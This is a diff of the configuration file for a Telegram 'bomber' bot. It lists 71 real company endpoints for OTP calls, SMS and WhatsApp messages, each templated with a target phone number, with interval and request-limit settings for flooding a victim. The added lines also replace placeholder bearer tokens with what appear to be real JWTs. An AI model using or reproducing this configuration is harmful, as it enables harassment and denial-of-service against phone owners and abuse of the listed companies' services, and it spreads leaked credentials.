@@ -1,40 +1,41 @@
-# config.py – Final Configuration for Advanced Telegram Bomber Bot
 import os
+import logging
+from dotenv import load_dotenv
 
-# ============================== DATABASE ==============================
-DB_FILE = "bot_data.db"
+load_dotenv()
 
-# ============================== BOT ENVIRONMENT ==============================
-BOT_TOKEN        = os.getenv("BOT_TOKEN")
-OWNER_ID         = int(os.getenv("OWNER_ID", "0"))
-PORT             = int(os.getenv("PORT", 10000))
-WEBHOOK_BASE     = os.getenv("RENDER_EXTERNAL_URL")  # Render sets this automatically
+# ---------- Telegram ----------
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+OWNER_ID = int(os.getenv("OWNER_ID", "0"))
+PORT = int(os.getenv("PORT", 10000))
+WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL") or os.getenv("WEBHOOK_URL") or ""
 
-# ============================== BRANDING ==============================
+# ---------- Logging ----------
+LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+LOG_LEVEL = logging.INFO
+
+# ---------- Branding ----------
 BRANDING = "\n\n🤖 <b>Powered by NULL PROTOCOL</b>"
 
-# ============================== BOMBING DEFAULTS ==============================
+# ---------- Bombing ----------
+API_INDICES = list(range(71))          # 71 APIs total
 DEFAULT_COUNTRY_CODE = "91"
+BOMBING_INTERVAL_SECONDS = 8
+MIN_INTERVAL = 1
+MAX_INTERVAL = 60
+MAX_REQUEST_LIMIT = 900000000000
+TELEGRAM_RATE_LIMIT_SECONDS = 2
+NORMAL_USER_AUTO_STOP_SECONDS = 10 * 60
 
-DEFAULT_CALL_INTERVAL = 25     # seconds between successive CALL API hits
-DEFAULT_SMS_INTERVAL   = 5     # seconds between SMS/WhatsApp rounds
+# ---------- Log Channel & Force Channels ----------
+LOG_CHANNEL_ID = -1003712674883
+FORCE_CHANNELS = []
 
-MIN_CALL_INTERVAL = 10
-MIN_SMS_INTERVAL  = 2
-MAX_INTERVAL      = 120
-
-AUTO_STOP_SECONDS   = 20 * 60   # 20 minutes per session
-MAX_REQUEST_LIMIT   = 9_000_000 # soft limit per session
-TELEGRAM_RATE_LIMIT = 5         # minimum seconds between status updates
-
-# ============================== 71 APIs ====================================
-# CALL APIs (7) – hit one by one every call_interval seconds
-# SMS / WHATSAPP APIs (64) – all fired together every sms_interval seconds
-BOMBER_APIS = [
-
-    # ----------------- CALL APIs (7) ------------------
+# ---------- 71 API Configurations ----------
+API_CONFIGS = [
+    # ================== CALL APIs (7) ==================
     {
-        "name": "GauravCyber Call",
+        "name": "GauravCyber Call API",
         "type": "CALL",
         "url": "https://bomm.gauravcyber0.workers.dev/?phone={phone}",
         "method": "GET",
@@ -42,7 +43,7 @@ BOMBER_APIS = [
         "data": None
     },
     {
-        "name": "Swiggy Call",
+        "name": "Swiggy Call (1)",
         "type": "CALL",
         "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
         "method": "POST",
@@ -50,7 +51,7 @@ BOMBER_APIS = [
         "data": '{"mobile":"{phone}"}'
     },
     {
-        "name": "Tata Capital 1",
+        "name": "Tata Capital (1)",
         "type": "CALL",
         "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
         "method": "POST",
@@ -58,7 +59,7 @@ BOMBER_APIS = [
         "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'
     },
     {
-        "name": "Tata Capital 2",
+        "name": "Tata Capital Voice (2)",
         "type": "CALL",
         "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
         "method": "POST",
@@ -66,7 +67,15 @@ BOMBER_APIS = [
         "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'
     },
     {
-        "name": "MakeMyTrip Voice",
+        "name": "Swiggy Call (2)",
+        "type": "CALL",
+        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": '{"mobile":"{phone}"}'
+    },
+    {
+        "name": "MakeMyTrip Voice Call",
         "type": "CALL",
         "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
         "method": "POST",
@@ -74,15 +83,7 @@ BOMBER_APIS = [
         "data": '{"phone":"{phone}"}'
     },
     {
-        "name": "Goibibo Voice 1",
-        "type": "CALL",
-        "url": "https://www.goibibo.com/user/voice-otp/generate/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": '{"phone":"{phone}"}'
-    },
-    {
-        "name": "Goibibo Voice 2",
+        "name": "Goibibo Voice Call",
         "type": "CALL",
         "url": "https://www.goibibo.com/user/voice-otp/generate/",
         "method": "POST",
@@ -90,7 +91,8 @@ BOMBER_APIS = [
         "data": '{"phone":"{phone}"}'
     },
 
-    # ----------------- SMS / WHATSAPP APIs (64) ------------------
+    # ================== SMS / WHATSAPP APIs (64) ==================
+    # --- पुराने बॉट से (13) ---
     {
         "name": "OYO Rooms",
         "type": "SMS",
@@ -116,7 +118,7 @@ BOMBER_APIS = [
         "data": '{"contactNumber":"{phone}"}'
     },
     {
-        "name": "Flipkart",
+        "name": "Flipkart 1",
         "type": "SMS",
         "url": "https://www.flipkart.com/api/6/user/signup/status",
         "method": "POST",
@@ -128,14 +130,11 @@ BOMBER_APIS = [
         "type": "SMS",
         "url": "https://accounts.practo.com/send_otp",
         "method": "POST",
-        "headers": {
-            "client-name": "Practo Android App",
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
+        "headers": {"client-name": "Practo Android App", "Content-Type": "application/x-www-form-urlencoded"},
         "data": "mobile=+91{phone}"
     },
     {
-        "name": "Goibibo SMS",
+        "name": "Goibibo",
         "type": "SMS",
         "url": "https://www.goibibo.com/common/downloadsms/",
         "method": "POST",
@@ -150,14 +149,13 @@ BOMBER_APIS = [
         "headers": {"Content-Type": "application/x-www-form-urlencoded"},
         "data": "mobile={phone}"
     },
-    # --- Gokwik based (tokens may expire, replace with fresh ones) ---
     {
         "name": "GheeAPI (Gokwik)",
         "type": "SMS",
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
         "method": "POST",
         "headers": {
-            "Authorization": "Bearer YOUR_JWT_HERE",        # <-- Replace with valid token
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
             "gk-merchant-id": "19g6im8srkz9y",
             "Content-Type": "application/json"
         },
@@ -169,7 +167,7 @@ BOMBER_APIS = [
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
         "method": "POST",
         "headers": {
-            "Authorization": "Bearer YOUR_JWT_HERE",
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
             "gk-merchant-id": "19an4fq2kk5y",
             "Content-Type": "application/json"
         },
@@ -201,7 +199,7 @@ BOMBER_APIS = [
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
         "method": "POST",
         "headers": {
-            "Authorization": "Bearer YOUR_JWT_HERE",
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
             "gk-merchant-id": "19kc37zcdyiu",
             "Content-Type": "application/json"
         },
@@ -219,8 +217,10 @@ BOMBER_APIS = [
         },
         "data": "phone={phone}&rcsconsent=true"
     },
+
+    # --- 100-बॉम्बर से (16) ---
     {
-        "name": "Hungama",
+        "name": "Hungama (1)",
         "type": "SMS",
         "url": "https://communication.api.hungama.com/v1/communication/otp",
         "method": "POST",
@@ -228,7 +228,7 @@ BOMBER_APIS = [
         "data": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}'
     },
     {
-        "name": "Dayco India",
+        "name": "Dayco India (1)",
         "type": "SMS",
         "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
         "method": "POST",
@@ -236,7 +236,7 @@ BOMBER_APIS = [
         "data": "api=send_otp&mob={phone}"
     },
     {
-        "name": "KPN Fresh",
+        "name": "KPN Fresh (1)",
         "type": "SMS",
         "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB",
         "method": "POST",
@@ -244,7 +244,7 @@ BOMBER_APIS = [
         "data": '{"phone_number":{"number":"{phone}","country_code":"+91"}}'
     },
     {
-        "name": "Servetel",
+        "name": "Servetel (1)",
         "type": "SMS",
         "url": "https://api.servetel.in/v1/auth/otp",
         "method": "POST",
@@ -252,7 +252,7 @@ BOMBER_APIS = [
         "data": "mobile_number={phone}"
     },
     {
-        "name": "GoPink Cabs",
+        "name": "GoPink Cabs (1)",
         "type": "SMS",
         "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
         "method": "POST",
@@ -291,9 +291,8 @@ BOMBER_APIS = [
         "headers": {"Content-Type": "application/json"},
         "data": '{"phone":"{phone}"}'
     },
-    # --- Bank APIs (may not deliver real OTPs but work as flooding) ---
     {
-        "name": "Axis Bank",
+        "name": "Axis Bank (1)",
         "type": "SMS",
         "url": "https://www.axisbank.com/api/otp",
         "method": "POST",
@@ -348,7 +347,8 @@ BOMBER_APIS = [
         "headers": {"Content-Type": "application/json"},
         "data": '{"phone":"{phone}"}'
     },
-    # --- WhatsApp APIs ---
+
+    # --- अनुराग प्रीमियम से (28) ---
     {
         "name": "KPN WhatsApp",
         "type": "WHATSAPP",
@@ -368,14 +368,29 @@ BOMBER_APIS = [
         "headers": {},
         "data": None
     },
-    # --- Rest SMS APIs ---
     {
-        "name": "NoBroker SMS",
+        "name": "NoBroker SMS (1)",
         "type": "SMS",
         "url": "https://www.nobroker.in/api/v3/account/otp/send",
         "method": "POST",
         "headers": {"Content-Type": "application/x-www-form-urlencoded"},
         "data": "phone={phone}&countryCode=IN"
+    },
+    {
+        "name": "Hungama (2)",
+        "type": "SMS",
+        "url": "https://communication.api.hungama.com/v1/communication/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}'
+    },
+    {
+        "name": "Dayco India (2)",
+        "type": "SMS",
+        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": "api=send_otp&mob={phone}"
     },
     {
         "name": "Lending Plate",
@@ -410,12 +425,20 @@ BOMBER_APIS = [
         "data": '{"phone":"{phone}"}'
     },
     {
-        "name": "NewMe",
+        "name": "Servetel (2)",
         "type": "SMS",
-        "url": "https://prodapi.newme.asia/web/otp/request",
+        "url": "https://api.servetel.in/v1/auth/otp",
         "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": '{"mobile_number":"{phone}","resend_otp_request":true}'
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": "mobile_number={phone}"
+    },
+    {
+        "name": "GoPink Cabs (2)",
+        "type": "SMS",
+        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": "check_mobile_number=1&contact={phone}"
     },
     {
         "name": "MyHubble Money",
@@ -553,8 +576,79 @@ BOMBER_APIS = [
         "headers": {},
         "data": None
     },
+
+    # ================== EXTRA 7 (Working) ==================
+    {
+        "name": "Hungama OTP (Original Working)",
+        "type": "SMS",
+        "url": "https://communication.api.hungama.com/v1/communication/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}'
+    },
+    {
+        "name": "Dayco India (Original Working)",
+        "type": "SMS",
+        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        "data": "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
+    },
+    {
+        "name": "Lending Plate (Original Working)",
+        "type": "SMS",
+        "url": "https://lendingplate.com/api.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        "data": "mobiles={phone}&resend=Resend"
+    },
+    {
+        "name": "GoKwik (Original Working)",
+        "type": "SMS",
+        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": '{"phone":"{phone}","country":"in"}'
+    },
+    {
+        "name": "NewMe (Original Working)",
+        "type": "SMS",
+        "url": "https://prodapi.newme.asia/web/otp/request",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": '{"mobile_number":"{phone}","resend_otp_request":true}'
+    },
+    {
+        "name": "Univest (Original Working)",
+        "type": "SMS",
+        "url": "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "Smytten (Original Working)",
+        "type": "SMS",
+        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": '{"phone":"{phone}","email":"test@example.com"}'
+    }
 ]
 
-# ============================== FILTERED LISTS ==============================
-CALL_APIS = [api for api in BOMBER_APIS if api["type"] == "CALL"]
-SMS_APIS  = [api for api in BOMBER_APIS if api["type"] in ("SMS", "WHATSAPP")]
+# ---------- User States ----------
+class State:
+    NONE = 0
+    AWAITING_PHONE = 1
+    AWAITING_CONFIRM = 2
+    AWAITING_ADMIN_BAN = 3
+    AWAITING_ADMIN_UNBAN = 4
+    AWAITING_ADMIN_DELETE = 5
+    AWAITING_ADMIN_BROADCAST = 6
+    AWAITING_ADMIN_DM_TARGET = 7
+    AWAITING_ADMIN_DM_MESSAGE = 8
+    AWAITING_ADMIN_ADDADMIN = 9
+    AWAITING_ADMIN_REMOVEADMIN = 10
+    AWAITING_ADMIN_LOOKUP = 11
+    AWAITING_ADMIN_PROTECT = 12
+    AWAITING_ADMIN_UNPROTECT = 13
